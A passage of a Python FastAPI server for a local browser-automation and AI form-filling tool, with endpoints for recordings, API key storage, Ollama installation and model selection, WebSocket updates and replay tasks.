        action_data = {k: v for k, v in action_data.items() if v is not None}

        result = live_recorder.record_action(action_data)
        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/recording/live/stop")
async def stop_live_recording(request: LiveRecordingStopRequest):
    """Stop live recording and save"""
    try:
        result = live_recorder.stop_session(recording_name=request.recording_name)

        # Properly save recording to index using recording_manager
        recording_data = result["recording_data"]
        recording_manager.save_recording(recording_data)

        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/recording/live/status")
async def get_live_recording_status():
    """Get current live recording session status"""
    try:
        status = live_recorder.get_status()
        return JSONResponse(content=status)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/recording/live/cancel")
async def cancel_live_recording():
    """Cancel current live recording without saving"""
    try:
        result = live_recorder.cancel_session()
        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/api-keys")
async def get_api_keys():
    """Get available API keys configuration"""
    api_keys_dir = Path("api_keys")
    api_keys = {}

    if api_keys_dir.exists():
        for file in api_keys_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    key_data = json.load(f)
                    service_name = file.stem
                    api_keys[service_name] = {
                        "configured": bool(key_data.get("api_key") or key_data.get("key")),
                        "service": service_name,
                        "masked_key": key_data.get("api_key", "")[:8] + "..." if key_data.get("api_key") else ""
                    }
            except:
                pass

    return JSONResponse(content=api_keys)

@app.post("/api/api-keys")
async def save_api_key(request: Request):
    """Save API key or configuration for a service"""
    try:
        data = await request.json()
        service = data.get("service")
        api_key = data.get("api_key")

        if not service or not api_key:
            raise HTTPException(status_code=400, detail="Service and API key are required")

        # Create api_keys directory if it doesn't exist
        api_keys_dir = Path("api_keys")
        api_keys_dir.mkdir(exist_ok=True)

        # Save API key or URL (for Ollama)
        key_file = api_keys_dir / f"{service}.json"

        # For Ollama, store as base_url instead of api_key
        if service == 'ollama':
            key_data = {
                "service": service,
                "api_key": api_key,  # Store URL in api_key field for consistency
                "base_url": api_key,
                "updated_at": datetime.now().isoformat()
            }
        else:
            key_data = {
                "service": service,
                "api_key": api_key,
                "updated_at": datetime.now().isoformat()
            }

        with open(key_file, 'w', encoding='utf-8') as f:
            json.dump(key_data, f, indent=2)

        logger.info(f"API key saved for service: {service}")

        return JSONResponse(content={
            "success": True,
            "message": f"{'Configuration' if service == 'ollama' else 'API key'} saved for {service}",
            "service": service,
            "configured": True
        })

    except Exception as e:
        logger.error(f"Error saving API key: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ollama/status")
async def get_ollama_status():
    """Check Ollama installation and running status"""
    try:
        installer = get_installer()
        status = installer.check_installation()

        # Add current model from .env
        current_model = os.getenv("OLLAMA_MODEL", "llama3.2")
        status["current_model"] = current_model

        return JSONResponse(content=status)
    except Exception as e:
        logger.error(f"Error checking Ollama status: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/ollama/install")
async def install_ollama(background_tasks: BackgroundTasks):
    """Trigger Ollama installation in background"""
    global ollama_installation_progress

    # Check if already installing
    if ollama_installation_progress["status"] == "installing":
        return JSONResponse(content={
            "success": False,
            "message": "Installation already in progress"
        })

    # Reset progress
    ollama_installation_progress = {

        "status": "installing",
        "percentage": 0,
        "message": "Starting installation...",
        "result": None
    }

    # Start installation in background
    async def run_installation():
        global ollama_installation_progress

        def progress_callback(status: str, percentage: int, message: str):
            ollama_installation_progress["status"] = status
            ollama_installation_progress["percentage"] = percentage
            ollama_installation_progress["message"] = message

        try:
            installer = get_installer(progress_callback)
            result = installer.install_complete()

            ollama_installation_progress["result"] = result
            if result["success"]:
                ollama_installation_progress["status"] = "complete"
                ollama_installation_progress["percentage"] = 100
                ollama_installation_progress["message"] = result["message"]
            else:
                ollama_installation_progress["status"] = "error"
                ollama_installation_progress["message"] = result["message"]

        except Exception as e:
            logger.error(f"Installation error: {e}", exc_info=True)
            ollama_installation_progress["status"] = "error"
            ollama_installation_progress["message"] = str(e)

    background_tasks.add_task(run_installation)

    return JSONResponse(content={
        "success": True,
        "message": "Installation started in background"
    })

@app.get("/api/ollama/install-progress")
async def get_install_progress():
    """Get current installation progress"""
    global ollama_installation_progress
    return JSONResponse(content=ollama_installation_progress)

@app.post("/api/ollama/download-model")
async def download_model(request: Request, background_tasks: BackgroundTasks):
    """Download a specific Ollama model"""
    global model_download_progress

    try:
        data = await request.json()
        model_name = data.get("model_name")

        if not model_name:
            raise HTTPException(status_code=400, detail="model_name is required")

        # Check if already downloading
        if model_name in model_download_progress and model_download_progress[model_name]["status"] == "downloading":
            return JSONResponse(content={
                "success": False,
                "message": "Model download already in progress"
            })

        # Initialize progress tracking
        model_download_progress[model_name] = {
            "status": "downloading",
            "percentage": 0,
            "message": "Starting download..."
        }

        # Start download in background
        async def run_download():
            global model_download_progress

            try:
                # Run ollama pull command
                process = subprocess.Popen(
                    ['ollama', 'pull', model_name],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )

                # Monitor progress
                for line in process.stdout:
                    line = line.strip()
                    if line:
                        # Parse progress from ollama output
                        if 'pulling' in line.lower():
                            model_download_progress[model_name]["message"] = line
                        elif '%' in line:
                            # Try to extract percentage
                            try:
                                percent_str = line.split('%')[0].split()[-1]
                                percentage = int(float(percent_str))
                                model_download_progress[model_name]["percentage"] = percentage
                                model_download_progress[model_name]["message"] = line
                            except:
                                model_download_progress[model_name]["message"] = line

                process.wait()

                if process.returncode == 0:
                    model_download_progress[model_name]["status"] = "complete"
                    model_download_progress[model_name]["percentage"] = 100
                    model_download_progress[model_name]["message"] = "Download complete"
                else:
                    model_download_progress[model_name]["status"] = "error"
                    model_download_progress[model_name]["message"] = "Download failed"

            except Exception as e:
                logger.error(f"Model download error: {e}", exc_info=True)
                model_download_progress[model_name]["status"] = "error"
                model_download_progress[model_name]["message"] = str(e)

        background_tasks.add_task(run_download)

        return JSONResponse(content={
            "success": True,
            "message": f"Started downloading {model_name}"
        })

    except Exception as e:
        logger.error(f"Error starting model download: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ollama/download-progress")
async def get_download_progress(model: str):
    """Get download progress for a specific model"""
    global model_download_progress

    if model not in model_download_progress:
        return JSONResponse(content={
            "status": "not_started",
            "percentage": 0,
            "message": "Download not started"
        })

    return JSONResponse(content=model_download_progress[model])

@app.post("/api/ollama/set-model")
async def set_model(request: Request):
    """Set the active Ollama model in .env"""
    try:
        data = await request.json()
        model_name = data.get("model_name")

        if not model_name:
            raise HTTPException(status_code=400, detail="model_name is required")

        # Check if model is installed
        installer = get_installer()
        status = installer.check_installation()

        if not status["installed"] or not status["running"]:
            raise HTTPException(status_code=400, detail="Ollama is not installed or not running")

        if model_name not in status["models_available"]:
            raise HTTPException(
                status_code=400,
                detail=f"Model {model_name} is not installed. Please download it first."
            )

        # Update .env file
        env_path = Path(".env")
        if env_path.exists():
            # Read current .env
            with open(env_path, 'r') as f:
                env_lines = f.readlines()

            # Update or add OLLAMA_MODEL
            found = False
            for i, line in enumerate(env_lines):
                if line.startswith("OLLAMA_MODEL="):
                    env_lines[i] = f"OLLAMA_MODEL={model_name}\n"
                    found = True
                    break

            if not found:
                env_lines.append(f"\nOLLAMA_MODEL={model_name}\n")

            # Write back
            with open(env_path, 'w') as f:
                f.writelines(env_lines)
        else:
            # Create .env file
            with open(env_path, 'w') as f:
                f.write(f"OLLAMA_MODEL={model_name}\n")

        # Update environment variable in current process
        os.environ["OLLAMA_MODEL"] = model_name

        return JSONResponse(content={
            "success": True,
            "message": f"Active model set to {model_name}"
        })

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error setting model: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/status")
async def get_status():
    """Get server status"""
    return JSONResponse(content={
        "status": "running",
        "version": "2.0.0",
        "profiles_count": len(profiles),
        "active_sessions": len(active_sessions),
        "websocket_connections": len(websocket_connections)
    })


# WebSocket endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for real-time updates"""
    await websocket.accept()
    websocket_connections.append(websocket)

    try:
        # Send initial connection message
        await websocket.send_json({
            "type": "connected",
            "message": "WebSocket connected"
        })

        # Keep connection alive
        while True:
            data = await websocket.receive_text()
            # Echo back or handle commands
            await websocket.send_json({
                "type": "echo",
                "data": data
            })

    except WebSocketDisconnect:
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)
    except Exception as e:
        # Silently handle websocket errors - they're expected during normal operation
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)

# Add automation runner function
async def run_automation(session_id: str, url: str):
    """Run the automation process"""
    if session_id not in active_sessions:
        return

    automation = active_sessions[session_id]

    try:
        await broadcast_message({
            "type": "automation_started",
            "session_id": session_id,
            "url": url
        })

        # Start browser and navigate
        success = await automation.start(url)

        if success:
            # Detect and fill forms
            fields_filled = await automation.detect_and_fill_forms()

            # Take screenshot
            screenshot = await automation.take_screenshot()

            await broadcast_message({
                "type": "automation_completed",
                "session_id": session_id,
                "fields_filled": fields_filled,
                "screenshot": screenshot
            })
        else:
            await broadcast_message({
                "type": "automation_failed",
                "session_id": session_id,
                "error": "Failed to start browser"
            })

    except Exception as e:
        await broadcast_message({
            "type": "automation_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Keep session open for further commands
        pass

@app.post("/api/automation/stop")
async def stop_all_automation():
    """Stop all active automation sessions"""
    stopped_sessions = []

    for session_id in list(active_sessions.keys()):
        try:
            automation = active_sessions[session_id]
            await automation.close()
            del active_sessions[session_id]
            stopped_sessions.append(session_id)
        except Exception:
            # Silently ignore errors when stopping sessions (may already be stopped)
            pass

    if stopped_sessions:
        await broadcast_message({
            "type": "automation_stopped",
            "sessions": stopped_sessions
        })

    return JSONResponse(content={
        "message": "Automation stopped",
        "sessions_stopped": len(stopped_sessions)
    })

@app.post("/api/automation/stop/{session_id}")
async def stop_automation(session_id: str):
    """Stop a specific automation session"""
    if session_id not in active_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    automation = active_sessions[session_id]
    await automation.close()
    del active_sessions[session_id]

    await broadcast_message({
        "type": "automation_stopped",
        "session_id": session_id
    })

    return JSONResponse(content={"message": "Automation stopped"})

# Browser-Use AI Automation Endpoints

@app.post("/api/automation/browser-use/start")
async def start_browser_use_automation(request: dict):
    """
    Start AI-powered form filling using browser-use

    Request body:
    {
        "profile_id": "profile-123",
        "url": "https://example.com/form",
        "headless": false,
        "max_steps": 50
    }
    """
    if not BROWSER_USE_ENABLED:
        raise HTTPException(
            status_code=503,
            detail="browser-use not installed. Run: pip install browser-use playwright langchain-openai"
        )

    try:
        profile_id = request.get("profile_id")
        url = request.get("url")
        headless = request.get("headless", False)
        max_steps = request.get("max_steps", 50)

        if not profile_id or not url:
            raise HTTPException(status_code=400, detail="profile_id and url are required")

        # Load profile
        profile_file = Path("profiles") / f"{profile_id}.json"
        if not profile_file.exists():
            raise HTTPException(status_code=404, detail=f"Profile {profile_id} not found")

        with open(profile_file, 'r') as f:
            profile = json.load(f)

        # Initialize browser-use automation
        automation = AsyncBrowserUseAutomation()

        # Run the automation
        result = await automation.fill_form(
            url=url,
            profile=profile,
            headless=headless,
            max_steps=max_steps
        )

        # Broadcast progress
        await broadcast_message({
            "type": "browser_use_completed",
            "data": result
        })

        return JSONResponse(content=result)

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/automation/browser-use/test")
async def test_browser_use():
    """Test browser-use setup"""
    if not BROWSER_USE_ENABLED:
        return JSONResponse(content={
            "success": False,
            "message": "browser-use not installed",
            "instructions": "Run: pip install browser-use playwright langchain-openai"
        })

    try:
        automation = AsyncBrowserUseAutomation()
        result = await automation.test_connection()
        return JSONResponse(content=result)
    except Exception as e:
        return JSONResponse(content={
            "success": False,
            "message": f"Test failed: {str(e)}"
        })

# Background task functions for replay operations

async def run_recording_replay(session_id: str, recording_id: str, profile: dict, session_name: str = None, preview_mode: bool = False):
    """Background task to run recording replay"""
    try:
        replay_engine = active_sessions.get(session_id)
        if not replay_engine:
            await broadcast_message({
                "type": "replay_error",
                "session_id": session_id,
                "error": "Replay engine not found"
            })
            return

        # Run the replay in a thread executor to avoid blocking the event loop
        # This allows async progress callbacks to be delivered in real-time
        import concurrent.futures
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = await loop.run_in_executor(
                executor,
                replay_engine.replay_recording,
                recording_id,
                profile,
                session_name,
                preview_mode
            )

        await broadcast_message({
            "type": "replay_completed",
            "session_id": session_id,
            "data": results
        })

    except Exception as e:
        await broadcast_message({
            "type": "replay_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Clean up session
        if session_id in active_sessions:
            del active_sessions[session_id]

async def run_template_replay(session_id: str, template_id: str, profile: dict, session_name: str = None):
    """Background task to run template replay"""
    try:
        replay_engine = active_sessions.get(session_id)
        if not replay_engine:
            await broadcast_message({
                "type": "template_replay_error",
                "session_id": session_id,
                "error": "Replay engine not found"
            })
            return

        # Run the template replay
        results = replay_engine.replay_template(template_id, profile, session_name)

        await broadcast_message({
            "type": "template_replay_completed",
            "session_id": session_id,
            "data": results
        })

    except Exception as e:
        await broadcast_message({
            "type": "template_replay_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Clean up session
        if session_id in active_sessions:
            del active_sessions[session_id]

# Static file serving (works in both dev and PyInstaller bundle)
app.mount("/static", StaticFiles(directory=str(BASE_PATH / "static")), name="static")
app.mount("/web", StaticFiles(directory=str(BASE_PATH / "web")), name="web")

def show_startup_animation():
    """Display cool startup animation with Gemini-style typewriter effect"""
    import time
    from colorama import Fore, Style, init
    init()

    def typewriter(text, delay=0.02, color="", end="\n"):
        """Print text with typewriter effect like Gemini CLI"""
        for char in text:
            print(f"{color}{char}{Style.RESET_ALL}", end='', flush=True)
            time.sleep(delay)
        print(end=end)

    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Large KPR ASCII art banner
    kpr_banner = """
██╗  ██╗██████╗ ██████╗
██║ ██╔╝██╔══██╗██╔══██╗
█████╔╝ ██████╔╝██████╔╝
██╔═██╗ ██╔═══╝ ██╔══██╗
██║  ██╗██║     ██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
"""

    for line in kpr_banner.strip().split('\n'):
        typewriter(line, 0.005, Fore.CYAN)

    print()
    typewriter("Browser Automation Platform", 0.015, Fore.CYAN)
    print()

    # Loading steps with typewriter effect and faster delays
    steps = [
        ("Initializing browser engine", 0.1),
        ("Loading automation modules", 0.08),
        ("Preparing AI field mapper", 0.08),
        ("Starting web server", 0.12),
        ("Configuring network", 0.08),
        ("Establishing secure connections", 0.08),
        ("Ready to launch", 0.1)
    ]

    for step, delay in steps:
        typewriter(f"▶ {step}...", 0.015, Fore.GREEN, end='')
        time.sleep(delay)
        print(f" {Fore.GREEN}✓{Style.RESET_ALL}")

    print()
    typewriter("━" * 54, 0.005, Fore.CYAN)
    typewriter("✓ Server running on http://localhost:5511", 0.02, Fore.GREEN)
    typewriter("⚠ Close this window to stop FormAI", 0.02, Fore.YELLOW)
    typewriter("━" * 54, 0.005, Fore.CYAN)
    print()

if __name__ == "__main__":
    import webbrowser
    import threading
    import time

    # Skip startup animation when launched from test.bat
    # show_startup_animation()

    print("\nServer starting on http://localhost:5511")
    print("Close this window to stop FormAI\n")

    def open_browser():
        """Open browser after a short delay"""
        time.sleep(1)  # Short delay for server to start
        try:
            webbrowser.open("http://localhost:5511")
        except:
            pass  # Silently fail if browser can't open

    # Start browser in background thread
    threading.Thread(target=open_browser, daemon=True).start()

    # Run the server (when terminal closes, this exits and server stops)
    uvicorn.run(
        app,
        host="127.0.0.1",
        port=5511,
        log_level="error",  # Only show errors, suppress info/warning logs
        access_log=False
    )